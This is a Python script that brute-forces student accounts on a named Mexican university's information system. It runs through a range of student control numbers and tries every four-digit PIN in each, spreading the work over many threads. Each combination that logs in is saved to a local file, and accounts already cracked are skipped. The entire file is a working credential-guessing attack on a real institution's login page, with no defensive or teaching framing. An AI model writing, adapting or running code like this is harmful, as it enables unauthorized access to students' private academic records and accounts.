import threading
import requests



# URL de inicio de sesión y otros parámetros configurables
login_url = "https://sii.itq.edu.mx/sistema/index.php"
target_control_numbers = list(range(20140900, 20141000))
password_ranges = [(1000, 4499), (5000, 9999)]
control_numbers_array = []
# Read usernames and passwords from the file
with open("supremepower.txt", "r") as file:
    lines = file.readlines()
for line in lines:
    control_number, nip = line.strip().split(':')
    control_numbers_array.append(int(control_number)) 
def generate_numbers(ctrl_number, password_range, success_event):
    session = requests.Session()
    
    for number in range(*password_range):
        formatted_number = f'{number:04}'
        data = {
            "no_de_control": ctrl_number,  # Reemplaza con tu número de control
            "password": formatted_number,  # Reemplaza con tu contraseña
        }

        try:
            response = session.post(login_url, data=data)
            if "modulos/alu/" in response.text:
                print("Inicio de sesión exitoso!")
                print(f"{ctrl_number}:{formatted_number}")
                with open("supremepower.txt", "a") as f:
                    f.write(f"{ctrl_number}:{formatted_number}\n")
                success_event.set()
                break
        except requests.RequestException as e:
            print(f"Error en la solicitud: {e}")
        finally:
            session.close()

if __name__ == "__main__":


    success_events = [threading.Event() for _ in target_control_numbers]
    threads = []

    for ctrl_number, success_event in zip(target_control_numbers, success_events):
        if ctrl_number in control_numbers_array:
            print("Número de control omitido:", ctrl_number)
            continue

        for password_range in password_ranges:
            print(f"Iniciando hilo para rango {password_range} en {ctrl_number}")
            thread = threading.Thread(target=generate_numbers, args=(ctrl_number, password_range, success_event))
            threads.append(thread)
            thread.start()

    # Esperar a que algún hilo marque su evento de éxito
    for success_event in success_events:
        success_event.wait()

    # Opcional: Esperar a que todos los hilos terminen
    for thread in threads:
        thread.join()
